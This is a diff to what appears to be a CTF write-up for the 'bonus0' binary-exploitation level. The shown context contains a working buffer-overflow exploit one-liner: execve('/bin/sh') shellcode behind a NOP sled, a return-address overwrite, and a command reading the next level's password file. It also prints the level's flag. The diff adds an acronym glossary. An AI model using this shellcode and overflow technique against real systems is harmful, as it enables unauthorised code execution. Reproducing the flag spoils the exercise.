@@ -40,5 +40,11 @@ Stack is RWE (executable) and ASLR is disabled.
 
 SC=$(python -c "print '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'") python -c "import pty,os,time,subprocess,struct; m,s=pty.openpty(); p=subprocess.Popen(['/home/user/bonus0/bonus0'],stdin=s,stdout=s,stderr=s,env={'SC':'\x90'*200+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80','PATH':'/bin:/usr/bin'}); os.close(s); time.sleep(0.3); os.write(m,'A'*20+'\n'); time.sleep(0.3); os.write(m,'B'*9+struct.pack('<I',0xbfffff73)+'B'*7+'\n'); time.sleep(0.5); os.write(m,'cat /home/user/bonus1/.pass\n'); time.sleep(1); print os.read(m,512)"
 
+### Acronyms
+SSH    Secure Shell                        A cryptographic network protocol for secure remote login and command execution over an unsecured network
+NX     No-eXecute                          A memory protection that marks regions (stack, heap) as non-executable; disabled here (RWE), allowing shellcode on the stack
+ASLR   Address Space Layout Randomization  A kernel security feature that randomizes base addresses; disabled here, making the NOP sled address predictable
+PTY    Pseudo-Terminal                     A software terminal pair (master/slave) that emulates a real terminal, used here to interact with the binary's stdin/stdout over SSH
+
 ### Flag
 `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
